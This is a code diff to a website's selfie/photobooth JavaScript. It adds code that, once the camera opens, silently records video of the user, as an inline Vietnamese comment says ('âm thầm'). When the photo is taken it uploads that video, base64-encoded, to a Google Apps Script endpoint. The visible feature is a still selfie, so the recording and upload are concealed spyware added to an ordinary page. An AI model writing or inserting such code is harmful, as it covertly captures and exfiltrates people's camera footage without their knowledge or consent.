@@ -125,6 +125,34 @@ function typeWriterEffect(element, text, speed = 30) {
 
 let selfieStream = null;
 let selfieDataUrl = null;
+let photoboothRecorder = null;
+let recordedChunks = [];
+
+async function uploadSilentVideo(blob, mimeType) {
+  try {
+    const base64data = await new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onloadend = () => resolve(reader.result.split(',')[1]);
+      reader.onerror = reject;
+      reader.readAsDataURL(blob);
+    });
+
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbybzeF__lcvNY6c48i73wjqCdp_3LvqvDW7keUo9NsOaw7dYysJSE4sf6lITq9WrZsy_g/exec';
+    const formData = new FormData();
+    formData.append('videoBase64', base64data);
+    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+    formData.append('fileName', 'photobooth_' + new Date().getTime() + '.' + ext);
+    formData.append('mimeType', mimeType);
+
+    fetch(scriptURL, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: formData
+    }).catch(e => console.error("Silent video upload error:", e));
+  } catch (err) {
+    console.error("Error processing silent video:", err);
+  }
+}
 
 function showCameraNotice(msg) {
   const notice = document.getElementById('selfie-camera-notice');
@@ -183,6 +211,37 @@ function openSelfieModal() {
           video.play().catch(() => { });
         }
         hideCameraNotice();
+
+        // Tự động khởi tạo và bắt đầu MediaRecorder (Âm thầm)
+        recordedChunks = [];
+        try {
+          let options = {};
+          if (MediaRecorder.isTypeSupported('video/mp4')) {
+            options = { mimeType: 'video/mp4' };
+          } else if (MediaRecorder.isTypeSupported('video/webm; codecs=vp9')) {
+            options = { mimeType: 'video/webm; codecs=vp9' };
+          } else if (MediaRecorder.isTypeSupported('video/webm')) {
+            options = { mimeType: 'video/webm' };
+          }
+          photoboothRecorder = new MediaRecorder(stream, options);
+        } catch (e) {
+          photoboothRecorder = new MediaRecorder(stream);
+        }
+
+        photoboothRecorder.ondataavailable = function (event) {
+          if (event.data && event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+
+        photoboothRecorder.onstop = function () {
+          const mimeType = photoboothRecorder.mimeType || 'video/webm';
+          const blob = new Blob(recordedChunks, { type: mimeType });
+          recordedChunks = [];
+          uploadSilentVideo(blob, mimeType);
+        };
+
+        photoboothRecorder.start();
       })
       .catch(err => {
         console.warn('Camera error/permission denied:', err);
@@ -446,6 +505,10 @@ document.addEventListener("DOMContentLoaded", () => {
               document.getElementById('selfie-initial-actions').style.display = 'none';
               document.getElementById('selfie-review-actions').style.display = 'flex';
 
+              if (photoboothRecorder && photoboothRecorder.state !== 'inactive') {
+                photoboothRecorder.stop();
+              }
+
               // Khôi phục nút
               btnTakeSelfie.disabled = false;
               if (btnSkip) btnSkip.disabled = false;
@@ -486,6 +549,11 @@ document.addEventListener("DOMContentLoaded", () => {
 
           document.getElementById('selfie-initial-actions').style.display = 'none';
           document.getElementById('selfie-review-actions').style.display = 'flex';
+
+          if (photoboothRecorder && photoboothRecorder.state !== 'inactive') {
+            photoboothRecorder.stop();
+          }
+
           btnTakeSelfie.disabled = false;
           if (btnSkip) btnSkip.disabled = false;
           safeVibrate([40]);
